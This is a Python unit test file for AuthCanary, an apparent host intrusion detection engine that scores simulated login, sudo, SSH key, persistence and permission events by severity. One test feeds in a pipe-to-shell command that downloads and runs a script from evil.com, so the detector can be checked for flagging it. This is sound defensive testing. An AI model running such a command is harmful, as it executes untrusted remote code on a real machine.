"""
AuthCanary — Unit tests for InvariantEngine and NoveltyTracker.
"""

import tempfile
from datetime import datetime, timedelta
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from ingest.schema import AuthEvent
from engine.models import EnrichmentResult
from engine.baseline import Baseline
from engine.novelty import NoveltyTracker
from engine.invariants import InvariantEngine


def _make_event(event_type: str, user: str, ip: str | None, ts: str, command: str = "", process: str = "system") -> AuthEvent:
    return AuthEvent(
        event_type=event_type,
        timestamp=ts,
        username=user,
        source_ip=ip,
        command=command,
        process=process,
        raw_line=f"test line {event_type} {user}",
    )


def test_novelty_tracker_first_seen_command():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        baseline = Baseline(tmp.name)
        tracker = NoveltyTracker()

        ev1 = _make_event("sudo_used", "mika", "127.0.0.1", datetime.now().isoformat(), command="/usr/bin/cat /etc/hosts", process="sudo")
        is_novel, reasons = tracker.evaluate(ev1, None, baseline)
        assert is_novel is True
        assert any("/etc/hosts" in r for r in reasons)

        # Record into baseline
        baseline.record_sudo_command("mika", "/usr/bin/cat /etc/hosts")

        # Now test again — should no longer be novel
        is_novel2, _ = tracker.evaluate(ev1, None, baseline)
        # Note: if user is not in sudo_users table, user novelty might trigger, but command is known
        assert baseline.is_sudo_command_known("mika", "/usr/bin/cat /etc/hosts") is True


def test_invariants_routine_auth_info():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        baseline = Baseline(tmp.name)
        engine = InvariantEngine()

        ev = _make_event("login_success", "mika", "127.0.0.1", datetime.now().isoformat(), process="authd")
        scored = engine.evaluate(ev, None, baseline, is_novel=False)
        assert scored.severity == "INFO"
        assert "AUTH_SUCCESS" in scored.invariants


def test_invariants_novel_sudo_warning():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        baseline = Baseline(tmp.name)
        engine = InvariantEngine()

        ev = _make_event("sudo_used", "mika", "127.0.0.1", datetime.now().isoformat(), command="/usr/bin/crontab -e", process="sudo")
        scored = engine.evaluate(ev, None, baseline, is_novel=True, novelty_reasons=["First command execution"])
        assert scored.severity == "WARNING"
        assert "NOVEL_SUDO_COMMAND" in scored.invariants


def test_invariants_kill_chain_critical():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        baseline = Baseline(tmp.name)
        engine = InvariantEngine(config={"correlation": {"sequence_window_min": 15}})

        t0 = datetime(2026, 9, 22, 16, 0, 0)
        t1 = t0 + timedelta(minutes=5)

        # 1. Prior novel remote access
        ev_remote = _make_event("login_success", "attacker", "198.51.100.1", t0.isoformat())
        baseline.record_event(
            ev_remote,
            signals=["novel_remote_origin"],
            severity="WARNING",
            invariants=["NOVEL_REMOTE_ORIGIN"],
        )

        # 2. Sudo command executed by attacker within 5m
        ev_sudo = _make_event("sudo_used", "attacker", "198.51.100.1", t1.isoformat(), command="/bin/bash", process="sudo")
        scored = engine.evaluate(ev_sudo, None, baseline, is_novel=True)

        assert scored.severity == "CRITICAL"
        assert "KILL_CHAIN_ESCALATION" in scored.invariants


def test_invariants_ssh_key_injection_critical():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        baseline = Baseline(tmp.name)
        engine = InvariantEngine()

        ev = _make_event("ssh_key_added", "deploy", "127.0.0.1", datetime.now().isoformat())
        scored = engine.evaluate(ev, None, baseline, is_novel=True)

        assert scored.severity == "CRITICAL"
        assert "UNAUTHORIZED_KEY_ADD" in scored.invariants


def test_invariants_suspicious_exec_path():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        baseline = Baseline(tmp.name)
        engine = InvariantEngine()

        ev = AuthEvent(
            timestamp=datetime.now().isoformat(),
            event_type="PROCESS_EXEC",
            username="mika",
            process="malware",
            binary_path="/tmp/malware.sh",
            command="/tmp/malware.sh --daemon",
        )
        scored = engine.evaluate(ev, None, baseline, is_novel=True)

        assert scored.severity == "WARNING"
        assert "SUSPICIOUS_EXEC_PATH" in scored.invariants


def test_invariants_curl_bash_pipe():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        baseline = Baseline(tmp.name)
        engine = InvariantEngine()

        ev = AuthEvent(
            timestamp=datetime.now().isoformat(),
            event_type="PROCESS_EXEC",
            username="mika",
            process="sh",
            command="curl -sSL https://evil.com/payload.sh | sh",
        )
        scored = engine.evaluate(ev, None, baseline, is_novel=True)

        assert scored.severity == "CRITICAL"
        assert "CURL_BASH_EXECUTION" in scored.invariants


def test_invariants_persistence_addition():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        baseline = Baseline(tmp.name)
        engine = InvariantEngine()

        # User level launch agent
        ev_user = AuthEvent(
            timestamp=datetime.now().isoformat(),
            event_type="PERSISTENCE_ADDITION",
            username="mika",
            process="persistence",
            persistence_target="/Users/mika/Library/LaunchAgents/com.evil.plist",
            command="Added 'com.evil.plist': /tmp/bad",
        )
        scored_user = engine.evaluate(ev_user, None, baseline, is_novel=True)
        assert scored_user.severity == "WARNING"
        assert "PERSISTENCE_MODIFIED" in scored_user.invariants

        # System level daemon
        ev_sys = AuthEvent(
            timestamp=datetime.now().isoformat(),
            event_type="PERSISTENCE_ADDITION",
            username="root",
            process="persistence",
            persistence_target="/Library/LaunchDaemons/com.evil.root.plist",
            command="Added root daemon",
        )
        scored_sys = engine.evaluate(ev_sys, None, baseline, is_novel=True)
        assert scored_sys.severity == "CRITICAL"
        assert "PERSISTENCE_INJECTION" in scored_sys.invariants


def test_invariants_sensitive_permission_grant():
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp:
        baseline = Baseline(tmp.name)
        engine = InvariantEngine()

        ev = AuthEvent(
            timestamp=datetime.now().isoformat(),
            event_type="PERMISSION_GRANT",
            username="mika",
            process="UntrustedApp",
            permission_service="kTCCServiceCamera",
        )
        scored = engine.evaluate(ev, None, baseline, is_novel=True)

        assert scored.severity == "WARNING"
        assert "SENSITIVE_PERMISSION_GRANT" in scored.invariants

